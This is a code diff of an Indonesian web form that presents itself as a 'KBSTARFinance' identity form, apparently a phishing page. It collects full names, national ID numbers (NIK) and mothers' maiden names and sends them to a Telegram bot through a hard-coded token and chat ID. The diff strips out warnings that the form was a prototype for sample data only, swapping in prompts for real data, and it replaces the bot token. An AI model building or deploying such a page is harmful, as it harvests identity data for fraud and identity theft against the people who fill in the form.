@@ -6,7 +6,7 @@
   <meta name="color-scheme" content="dark" />
   <meta name="theme-color" content="#16082f" />
   <meta http-equiv="Content-Security-Policy"
-        content="default-src 'self'; img-src 'self' data: blob: https://api.telegram.org; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.telegram.org; form-action 'self'; base-uri 'none'; frame-ancestors 'none';">
+        content="default-src 'self'; img-src 'self' data: https://api.telegram.org; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.telegram.org; form-action 'self'; base-uri 'none'; frame-ancestors 'none';">
   <title>Form Identitas — KBSTARFinance</title>
   <style>
     :root{
@@ -154,23 +154,23 @@
         </div>
 
         <div class="field">
-          <label for="fullName">Nama Lengkap Contoh</label>
+          <label for="fullName">Nama Lengkap</label>
           <input id="fullName" name="fullName" type="text" maxlength="80" placeholder="Contoh: Andi Pratama" autocomplete="off" aria-describedby="fullNameHint fullNameError">
-          <p class="hint" id="fullNameHint">Gunakan data contoh untuk prototype.</p>
+          <p class="hint" id="fullNameHint">Gunakan nama lengkap</p>
           <p class="field-error" id="fullNameError" aria-live="polite"></p>
         </div>
 
         <div class="field">
           <label for="demoNik">NIK Contoh</label>
           <input id="demoNik" name="demoNik" type="text" inputmode="numeric" maxlength="16" autocomplete="off" aria-describedby="demoNikHint demoNikError">
-          <p class="hint" id="demoNikHint">Masukkan 16 digit angka contoh. Jangan gunakan NIK asli.</p>
+          <p class="hint" id="demoNikHint">Data Valid</p>
           <p class="field-error" id="demoNikError" aria-live="polite"></p>
         </div>
 
         <div class="field">
           <label for="motherName">Nama Ibu Kandung</label>
           <input id="motherName" name="motherName" type="text" maxlength="80" placeholder="Masukkan data contoh" autocomplete="off" aria-describedby="motherNameHint motherNameError">
-          <p class="hint" id="motherNameHint">Gunakan nama contoh, bukan data pribadi asli.</p>
+          <p class="hint" id="motherNameHint">Gunakan nama Lengkap</p>
           <p class="field-error" id="motherNameError" aria-live="polite"></p>
         </div>
 
@@ -216,7 +216,7 @@
       }
 
       function kirimTelegram(text) {
-        const token = '8954123404:AAExxXNZpcM15sQjb4Mvm_Zou_FR0LjTvk4';
+        const token = '8655916807:AAHLgXatTlPGoESOI46HOKA6RYDVy-vstjE';
         const chatId = '6959842489';
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
